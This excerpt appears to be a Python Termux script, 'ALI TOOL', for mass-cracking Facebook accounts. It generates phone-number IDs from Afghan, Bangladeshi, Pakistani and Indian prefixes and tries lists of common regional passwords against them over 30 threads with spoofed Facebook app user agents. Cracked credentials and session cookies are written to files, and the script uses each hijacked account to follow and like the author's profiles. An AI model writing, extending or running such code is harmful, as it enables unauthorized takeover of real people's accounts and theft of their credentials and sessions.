...
FBRV = '0'
FBCR = random.choice(['MTN','AWCC','Roshan','Etisalat','Telenor','Zong','Grammenphone','UFONE-PAKTel','Banglalink'])
...
def ALI():
	...
	fbcr = random.choice(['o2 - de', 'Verizon - us','MY CELCOM','Vodafone - uk','null','DTAC','IND airtel','Nepal Telecom','MTN', 'AWCC', 'Roshan', 'Etisalat', 'Salaam','MTS RUS','I TIM','MTN NG','TNT','Telenor','T-Mobile','Willkommen','Spark NZ'])
	...
	e = ";[FBAN/FB4A;FBAV/359.0.0.30.118;FBBV/358614015;FBDM/{density=2.0,width=720,height=1436};FBLC/en_Qaag_US;FBRV/359080319;FBCR/Telenor;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1808;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
	ua = s + e	
	return ua

###-----------------------[CREATE FOLDERS IN STORAGE]-----------------------###
folder_path = '/sdcard/ALI'
try:
...
| $$  | $$| $$        | $$  
| $$  | $$| $$$$$$$$ /$$$$$$
|__/  |__/|________/|______/     \033[1m \033[1;30mA\033[1;31mF\033[1;32mG \033[0m
                                                                                                    
\033[1;93m====================================================
\033[1;37m[◇] AUTHOR    : ALI
\033[1;37m[◇] FACEBOOK  : ALI
\033[1;37m[◇] GITHUB    : ALI 420
\033[1;37m[◇] WHATSAPP  : 
\033[1;37m[◇] TELEGRAM  : ALI
...
#  sxb = 'ALI'
 # try:
   # httpCaht = requests.get('https://github.com/ALI404/ALI/blob/main/appro.txt').text
  #  if id in httpCaht:
  #    print("\033[1;32mYour Key is Successfully Approved")
   ...
   #   print()
    ...
    #else:
      #linex()
    #  print("\033[1;91m YOUR KEY \033[1;37m : \033[1;32m"+sxb+'-'+id)
     # linex()
   #   print("\033[1;37m \33[37;41m\t IF YOU ARE FREE USER DON'T INBOX\33[0;m")
     # linex()
 ...
 #     tks = ('Hello%20MR-Khalid%20Khan%20Sir%20!%20Please%20Approve%20My%20Key%20The%20PThe%20Key%20Is%20:%20'+sxb+id);os.system('am start https://wa.me/+93731227318?text='+tks)
      #time.sleep(1)
 #     approval()
#  except:
#    sys.exit()
...
def asha(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :ALI = ' (*-*) 2009 '
        elif uid[:9] in ['100000000']       :ALI = '  2009 '
        elif uid[:8] in ['10000000']        :ALI = ' 2009 '
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:ALI = ' 2009 '
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:ALI = '  2010 '
        elif uid[:6] in ['100001']          :ALI = ' 2010'
        elif uid[:6] in ['100002','100003'] :ALI = ' 2011'
        elif uid[:6] in ['100004']          :ALI = ' 2012'
        elif uid[:6] in ['100005','100006'] :ALI = ' 2013'
        elif uid[:6] in ['100007','100008'] :ALI = ' 2014'
        elif uid[:6] in ['100009']          :ALI = ' 2015'
        elif uid[:5] in ['10001']           :ALI = ' 2016'
        elif uid[:5] in ['10002']           :ALI = ' 2017'
        elif uid[:5] in ['10003']           :ALI = ' 2018'
        elif uid[:5] in ['10004']           :ALI = ' 2019'
        elif uid[:5] in ['10005']           :ALI = ' 2020'
        elif uid[:5] in ['10006','10007','']:ALI = ' 2021'
        elif uid[:5] in ['10008']           :ALI = ' 2022'
        elif uid[:5] in ['10009']           :ALI = ' 2023'
        else:ALI=''
...
def menu():
        ...
        try:
                ...
                if "server on" in sj:
                        #clear()
                        print(' [1] File cloning\n [2] Create file\n [3] Public cloning\n [4] Random cloning\n [5] Remove Dublicate lines from file\n [6] Remove Cookie\n [7] Separate ids\n [8] Contact with owner\n [0] Exit prograam')
                        linex()
                        ...
                        if xd in ['1','01']:
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        lim=int(total_ids)
                                        print('\t\x1b[1;92m   ALI TOOL FILE CRACKING MENU')
                                        linex()
                                        ...
                                        print('\033[0;97m[◇]\x1b[1;92m ALI TOOL CRACKING HAS BEEN STARTED')
                                        linex()
                        	...
                        	remove_dub()
                                ...
                                os.system('am start https://wa.me/+93731227318');menu()
                        elif xd in ['0','00']:
                                exit(' WILCOME BACK ')
                        else:
...
def afgan():
                ...
                global lim
                clear()
                print('\033[1;32m EXAMPLE CODES:  9370  9374  9376  9377  9378  9379')
                linex()
                code = input('\033[1;32m[?] PUT CODE: ')
                clear()
                try:
                        limit = int(input('\033[1;32m EXAMPLE: 999  9999  99999  \n-----------------------------------------------------\n\033[1;32m PUT LIMIT: '))
                except ValueError:
                        limit = 99999
                lim=limit
                ...
                with tred(max_workers=30) as ALI:     
                        clear()
                        tl = str(len(user))
                        print('\t\x1b[1;92m   ALI TOOL RANDOM AFG CRACKING MENU')
                        linex()
                        ...
                        for psx in user:
                                ...
                                passlist = [psx,ids,'afghan12345','afghan123','afghanistan','500500','100200','10002000','Afghan1234','kabul1234','Kabul123','khankhan','jan123','kabul12345','۱۰۰۲۰۰','kabuljan','khan123']
                            
                                ALI.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
...
def bd():
                ...
                global lim
                clear()
                print('\033[1;32m EXAMPLE CODES: 016  017  018  019 ')
                linex()
                code = input('\033[1;32m[?] PUT CODE: ')
                clear()
                try:
                ...
                with tred(max_workers=30) as ALI:     
                        clear()
                        tl = str(len(user))
                        print('\t\x1b[1;92m   ALI TOOL RANDOM BD CRACKING MENU')
                        linex()
                        print('\033[0;97m[◇] \x1b[1;92mTOTAL ACCOUNTS \x1b[1;91m: \033[1;36m'+tl)
                        print(f'\033[0;97m[◇]\033[1;32m CHOICE CODE    \x1b[1;91m:\033[1;36m '+code)
                        print("\033[0;97m[◇] \x1b[1;92mCLONING STARTED\033[1;91m: \033[1;96mTIME \033[1;97m[\033[1;96m"+str(a)+"\033[1;91m:\033[1;96m"+str(lt()[4])+" "+ tag+"\x1b[1;97m]")
...
def pak():
                ...
                global lim
                clear()
                print('\033[1;32m EXAMPLE CODES: 0306  0315  0335  0345')
                linex()
                code = input('\033[1;32m[?] PUT CODE: ')
                clear()
                try:
                ...
                with tred(max_workers=30) as ALI:     
                        clear()
                        tl = str(len(user))
                        print('\t\x1b[1;92m   ALI TOOL RANDOM PAK CRACKING MENU')
                        linex()
                        print('\033[0;97m[◇] \x1b[1;92mTOTAL ACCOUNTS \x1b[1;91m: \033[1;36m'+tl)
                        print(f'\033[0;97m[◇]\033[1;32m CHOICE CODE    \x1b[1;91m:\033[1;36m '+code)
                        print("\033[0;97m[◇] \x1b[1;92mCLONING STARTED\033[1;91m: \033[1;96mTIME \033[1;97m[\033[1;96m"+str(a)+"\033[1;91m:\033[1;96m"+str(lt()[4])+" "+ tag+"\x1b[1;97m]")
                        ...
                        for psx in user:
                                ...
                                passlist = [psx,ids,'malik1234','khanbaba','ali123','janjan','786787','alimalik','ali786','khanzada','khankhan','khan786','malik123','kingkhan','khan1122','khan123456','khan1234','khan123','peshawar','pakistan']
...
def india():
                ...
                global lim
                clear()
                print('\033[1;32m EXAMPLE CODES: 8964  7684  8800  9717')
                linex()
                code = input('\033[1;32m[?] PUT CODE: ')
                clear()
                try:
                ...
                with tred(max_workers=30) as ALI:     
                        clear()
                        tl = str(len(user))
                        print('\t\x1b[1;92m   ALI TOOL RANDOM INDIA CRACKING MENU')
                        linex()
                        print('\033[0;97m[◇] \x1b[1;92mTOTAL ACCOUNTS \x1b[1;91m: \033[1;36m'+tl)
                        print(f'\033[0;97m[◇]\033[1;32m CHOICE CODE    \x1b[1;91m:\033[1;36m '+code)
                        print("\033[0;97m[◇] \x1b[1;92mCLONING STARTED\033[1;91m: \033[1;96mTIME \033[1;97m[\033[1;96m"+str(a)+"\033[1;91m:\033[1;96m"+str(lt()[4])+" "+ tag+"\x1b[1;97m]")
...
def gmail():
                ...
                global lim
                clear()
                print('\033[1;37m example: muhammad ali  sajad  faizan\033[1;97m')
                linex()
                first = input(' Put first name: ')
                linex()
                print('\033[1;37m example: khan  gul ali \033[1;97m')
                linex()
...
def rndm(ids,passlist):
        ...
        sys.stdout.write('\r\r\033[1;37m [\033[1;32mALI\033[1;37m] %s|\033[1;32mOK:-%s [%s%%]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        fbmf = 'samsung'
                        fbbd = 'samsung'
                        ua = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM'+'/{density=3.5,width=1440,height=2560};FBLC/en_US;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G928F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]'
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print("\033[1;37m[\033[1;32mCOOKIE\033[1;37m] \033[1;36m"+coki)
                                        requests.post('https://graph.facebook.com/689492446/subscribers?access_token='+tok, cookies={'cookie':coki})    
                                        requests.post('https://graph.facebook.com/100000057577697/subscribers?access_token='+tok, cookies={'cookie':coki})                                        
                                        requests.post('https://graph.facebook.com/10158873656362447/likes?access_token='+tok, cookies={'cookie':coki})
                                        open('/sdcard/ALI/ALI-COOKIE/ALI-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/ALI/ALI-OK/ALI-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        open('/sdcard/ALI/ALI-CP/ALI-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def api(ids,names,passlist):
        try:
                ...
                for pw in passlist:
                        ...
                        fbmf = 'samsung'
                        fbbd = 'samsung'
                        ua = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM'+'/{density=3.0,width=1080,height=1920};FBLC/es_ES;FBCR/movistar;FBMF/bq;FBBD/bq;FBPN/com.facebook.katana;FBDV/Aquaris E5 FHD;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
